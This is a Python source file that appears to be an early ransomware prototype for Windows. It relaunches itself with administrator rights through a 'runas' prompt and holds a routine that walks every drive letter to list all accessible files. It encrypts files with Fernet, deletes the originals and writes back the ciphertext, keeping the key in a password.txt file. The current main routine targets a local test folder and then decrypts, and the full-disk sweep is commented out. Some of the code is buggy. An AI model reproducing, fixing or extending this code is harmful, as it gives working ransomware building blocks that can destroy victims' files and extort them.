import os
import random
import string
import ctypes
import sys

from cryptography.fernet import Fernet


# IF not admin
#   Run self with admin
#   kill current self
# Else continue

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False



def key_generator():
    '''Generate a 128 character Key'''
    char = string.ascii_letters + string.digits + string.punctuation
    key = ''.join(random.choice(char) for i in range(128))
    print(key)


def get_all_accessible_files_in_Dir(init_path:str):
    '''find all the folder it can
    :param:return: return all the folder it could find
    '''
    init_path = f'{init_path}\\'
    files = []
    try:
        for path in os.listdir(init_path):
            if os.path.isfile(os.path.join(init_path, path)):
                files.append(init_path + path)
    except:
        print(f'invalide root {init_path}')

    return files


def get_all_accessible_folder_in_dir(init_path:str):
    '''
    :param init_path: where to look in directory
    :return: all the directorys in there
    '''
    folders = []
    try:
        for path in os.listdir(init_path):
            if os.path.isdir(init_path):
                folders.append(init_path + path)
    except:
        print(f'no access to folder : {init_path}')
    return folders


def get_all_accessible():
    ''''
    find all the directorys in the computer
    '''
    possible_Init = string.ascii_uppercase
    directorys = []
    files = []
    ended_directory = []
    for i in possible_Init:
        init_path = f'{i}:\\'

        try:

            directorys.append(init_path)
            directorys = get_all_accessible_folder_in_dir(init_path)
            files = files + get_all_accessible_files_in_Dir(init_path)
            ended_directory.append(init_path)
            for e in directorys:
                directorys = directorys + get_all_accessible_folder_in_dir(f'{e}\\')
                files = files + get_all_accessible_files_in_Dir(f'{e}\\')
                ended_directory.append(e)
                directorys.remove(e)
            print(f'directorys : {directorys}')
            print(f'files : {files}')
            print(f'ended directorys : {ended_directory}')
        except:
            print('lol')
    final = files
    return final


def encrypt_file(file_path: str, F_key: Fernet):
    try_count = 0
    # READ FILE
    with open(file_path, 'rb') as ef:
        data = ef.read()

    # ENCRYPT
    data = F_key.encrypt(data)

    while os.path.isfile(file_path) or try_count <= 5:
        try:
            # DELETE
            os.remove(file_path)
            # REWRITE FILE
            with open(file_path, 'wb') as ef:
                print("rewrite",file_path)
                ef.write(data)
                break
        finally:
            try_count += 1


def decrypt_file(file_path:str, F_key:Fernet):
    with open(file_path, 'rb') as ef:
        data = ef.read()
    ddata = F_key.decrypt(data)
    with open(file_path, 'wb') as ef:
        ef.write(ddata)
    ef.close()

def Get_Key_from_file(file_to_key:str):
    data = ''
    with open(file_to_key,'r') as password :
        data = password.read()
    data = data.strip('Key : ')
    return Fernet(data.encode())

#write the key in a file
def key_memory(F_keys:[]):
    with  open('password.txt', 'w') as txt:
        for e in F_keys:
            txt.write(f'Key : {e.decode()}')




"""def encrypt_file(file_path,F_key):
    print(f'Encrypthing File : {file_path}')
    try:
         with open(file_path,'rb') as ef:
             data = ef.read()
             print('can oppen the data')
    except:
        print(f'can\'t oppen the file {file_path}')"""

# files = get_all_accessible()
"""for e in files:
    print(encrypt_file(e,cipher))"""

# print(f"The folder returned is : {files}")


def main():
    # Look if program is admin
    if is_admin():
        keys = []
        files = get_all_accessible_files_in_Dir('.\\encrypt_thing')
        folder_to_encrypt = '.\\encrypt_thing\\WAS2_Subnet_worksheet.docx'
        for i in range(1):
            key = Fernet.generate_key() # key generator
            cipher = Fernet(key) # hash the key
            print(f'Key : {key.decode()}')
            for e in files:
                encrypt_file(e, cipher)
            keys.append(key)
        test = input("press enter to remove encryption")
        num = len(keys)

        key_memory(keys)

        the_word = Get_Key_from_file('password.txt')
        while num > 0:
            for e in files :
                decrypt_file(e, the_word)
            num = num - 1
    else:
        # Re-run the program with admin rights
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)


if __name__ == "__main__":
    main()

